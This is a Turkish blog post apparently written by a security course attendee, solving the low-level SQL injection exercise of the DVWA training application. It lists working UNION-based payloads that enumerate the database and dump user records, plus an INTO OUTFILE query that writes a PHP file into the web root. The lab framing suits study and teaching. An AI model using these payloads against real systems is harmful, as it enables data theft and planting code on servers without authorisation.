---
layout: post
title: DVWA-SQL Injection Bölümü Cevapları Level: Low
date: 2015-09-02 16:52
author: ahmetgurel
comments: true
categories: [dvwa, dvwa cevapları, dvwa solutions, dvwa sql injection, dvwa sql injection cevapları, dvwa sql injection level low, dvwa sql injection solutions, kali linux dvwa, kaliye dvwa kurulumu, linux yaz kampı, Siber Güvenlik, Web Uygulama Güvenliği]
---
Yazıma başlamadan önce yeniden hatırlatmamda fayda var bu yaz Linux Yaz Kampında <a href="https://www.mehmetince.net/lyk-2015-web-uygulama-guvenligi-ve-guvenli-kod-gelistirme-kursu/"> Web Uygulama Güvenliği ve Güvenli Kod Geliştirme</a> kursuna katıldım.Orada öğrendiğim şeylerin bazılarını blogumdan paylaşmaya çalışıyorum.Başta <a href="https://twitter.com/mdisec">Mehmet İnce</a> ve <a href="https://twitter.com/Barknkilic">Barkın Kılıç</a> olmak üzere emeği geçen tüm hocalarımıza yeniden teşekkür ederim.Daha önceki yazımda DVWA nedir ve nasıl kurulur anlatmıştım.Bu yazımda ise DVWA ın SQL Injection bölümünün Low leveline ait  kendi cevaplarımı  buradan paylaşacağım.Bir önceki yazıya <a href="http://www.gurelahmet.com/dvwa-nedir-ve-linuxakali-kurulumu/"> buradan</a> ulaşıp DVWA sistemini kurabilirsiniz.

Cevaplara geçmeden önce levelinizin LOW olduğundan emin olunuz.

<strong>SQL Injection Tespiti</strong>

İlk olarak

[php] 1' or '1'='1 [/php]

denemesi ile SQL Injection tespiti yapıyoruz ve sorguların tek tırnak ile olduğunu

görüyoruz.

<a href="http://www.gurelahmet.com/wp-content/uploads/2015/09/1.png"><img class="alignnone size-full wp-image-491" src="http://www.gurelahmet.com/wp-content/uploads/2015/09/1.png" alt="1" width="1011" height="709" /></a>

<strong>Veritabanındaki Kolon Sayısının Tespiti</strong>

[php] 1' UNION SELECT 1,2 # [/php]

sorgusu ile veritabanında iki kolon olduğunu gördük.

&nbsp;

<a href="http://www.gurelahmet.com/wp-content/uploads/2015/09/2.png"><img class="alignnone size-full wp-image-499" src="http://www.gurelahmet.com/wp-content/uploads/2015/09/2.png" alt="2" width="729" height="561" /></a>

&nbsp;

<strong>Veritabanının Versiyon Bilgisi</strong>

[php]1' UNION SELECT version(),2 # [/php]

sorgusu ilede versiyon bilgisini elde edebiliriz.

&nbsp;

<a href="http://www.gurelahmet.com/wp-content/uploads/2015/09/3.png"><img class="alignnone size-full wp-image-500" src="http://www.gurelahmet.com/wp-content/uploads/2015/09/3.png" alt="3" width="721" height="555" /></a>

<strong>Veritabanının İsim Bilgisi</strong>

[php] 1' UNION SELECT database(),2 # [/php]

sorgusu ilede database ismine ulaşabiliriz.

&nbsp;

<a href="http://www.gurelahmet.com/wp-content/uploads/2015/09/4.png"><img class="alignnone size-full wp-image-501" src="http://www.gurelahmet.com/wp-content/uploads/2015/09/4.png" alt="4" width="729" height="553" /></a>

<strong>Veritabanındaki Tabloların Belirlenmesi</strong>

[php] 1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema = 'dvwa' # [/php]

sorgusu ile daha önce bulduğumuz <strong>dvwa</strong>   database ine ait tabloların isimlerine ulaşabiliriz.<a href="http://www.gurelahmet.com/wp-content/uploads/2015/09/5.png"><img class="alignnone size-full wp-image-502" src="http://www.gurelahmet.com/wp-content/uploads/2015/09/5.png" alt="5" width="770" height="554" /></a>

Buradaki çıktıda<strong> dvwa</strong> veritabanında  <strong>guestbook</strong> ve <strong>users</strong> olmak üzere iki adet tablo olduğunu gördük.

<strong>Tabloların Kolonlarının Belirlenmesi</strong>

[php] 1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_schema='dvwa' AND table_name='users' # [/php]

sorgusu ile<strong> dvwa</strong> veritabanının <strong>users</strong> tablosunun kolonlarına ulaşabiliriz.

<a href="http://www.gurelahmet.com/wp-content/uploads/2015/09/8.png"><img class="alignnone size-full wp-image-503" src="http://www.gurelahmet.com/wp-content/uploads/2015/09/8.png" alt="8" width="783" height="561" /></a>

Bu çıktıda ise dediğimiz gibi <strong>dvwa</strong> veritabanının <strong>users</strong> tablosunun <strong>user_id</strong>,<strong>first_name</strong>,<strong>last_name</strong>,<strong>user</strong>,<strong>password</strong>,<strong>avatar</strong> adlı kolonlarının olduğunu görmüş olduk.

<strong>Tablolardaki Verileri Ekrana Yazdırma</strong>

[php] 1' UNION SELECT first_name,last_name FROM users # [/php]

sorgusu ilede <strong>dvwa</strong> veritabanındaki <strong>users</strong> tablosundan <strong>first_name</strong> ve <strong>last_name</strong> verilerini çektik.

<a href="http://www.gurelahmet.com/wp-content/uploads/2015/09/veri-cekme.png"><img class="alignnone size-full wp-image-504" src="http://www.gurelahmet.com/wp-content/uploads/2015/09/veri-cekme.png" alt="veri cekme" width="737" height="575" /></a>

<strong>SORGU İLE DOSYA EKLEME</strong>

[php] 1' UNION SELECT '&lt;?php echo &quot;ahmet gurel&quot;;','?&gt;' INTO OUTFILE '/var/www/html/dvwa/ahmet.php' # [/php]

sorgusu ile <strong>ahmet.php</strong> dosyası oluşturup içine küçük bir php kodu ekledik.Buraya daha farklı kodlar ve sayfalar oluşturabiliriz.

<a href="http://www.gurelahmet.com/wp-content/uploads/2015/09/veri-ekleme.png"><img class="alignnone size-full wp-image-505" src="http://www.gurelahmet.com/wp-content/uploads/2015/09/veri-ekleme.png" alt="veri ekleme" width="1012" height="709" /></a>

&nbsp;

Sorgumuz çalıştı ve<strong> ahmet.php</strong> dosyası oluştu.Bu dosyaya <strong>127.0.0.1/dvwa/ahmet.php</strong> adresine gittiğimde görüyorum.

<a href="http://www.gurelahmet.com/wp-content/uploads/2015/09/ver-ekleme2.png"><img class="alignnone size-full wp-image-506" src="http://www.gurelahmet.com/wp-content/uploads/2015/09/ver-ekleme2.png" alt="ver ekleme2" width="1014" height="700" /></a>Burada <strong>admin admin ahmet gurel y</strong>azıyor  aslında  biz php kodumuzda sadece ahmet gurel yazmıstık.Bunun nedeni <strong> UNION</strong> dan önceki 1' çalıştığında ilk kullanıcıyı admin admin döndürüp koda eklemesinden kaynaklanıyor.

Birde bu dosya ekleme saldırısını yapmaya çalıştığında okuma ve yazma yetkiniz yok gibi bir hata alıyorsanız.Linuxta <strong>dvwa</strong> nın bulunduğu yere  aşağıdaki resimdeki gibi okuma ve yazma izni vererek bu saldırı metodunu deneyebilirsiniz.

<a href="http://www.gurelahmet.com/wp-content/uploads/2015/09/izin.png"><img class="alignnone size-full wp-image-507" src="http://www.gurelahmet.com/wp-content/uploads/2015/09/izin.png" alt="izin" width="1008" height="639" /></a>

&nbsp;

&nbsp;

Gördüğünüz gibi SQL Injection açığı bulunan bir sistemde veritabanı isminden,tablo isimlerine,tabloların kolon isimlerine,kullanıcı adlarına,şifrelerine gibi tüm veritabanı bilgilerini çektik ve kendimiz dosya oluşturup içine kendi kodumuzu çalıştırdık.SQL Injection saldırısının ne kadar tehlikeli olabileceğinin yanında nasıl yapıldığını neler yapabileceğimizi birlikte bu sistem üzerinde manuel olarak inceledik.SQL bilgimiz ne kadar iyiyse o kadar fazla saldırı metodu oluşturup çok daha farklı şeyler yapmak bizim elimizde.Tabiki SQL Injection dendiğinde çoğu kişi bunu manuel değilde <strong>SQL MAP</strong> ile yapmakta.Burdaki sistemde kendinizi geliştirip mantığını anladıktan sonra<strong> SQL MAP</strong> i öğrenip kullanmanızı tavsiye ederim.Bunun dışında işinize web açıklarını ararken,test ederken Firefox ve Chrome üzerinde bir çok eklenti bulunmakta.Pentesterlar için Firefox eklentileri adlı yazıya <a href="http://www.unluagyol.com/2013/12/pentestlerde-kullanlacak-firefox.html">buradan</a> ulaşıp inceleyebilirsiniz.Bir başka yazıda görüşmek üzere...

&nbsp;
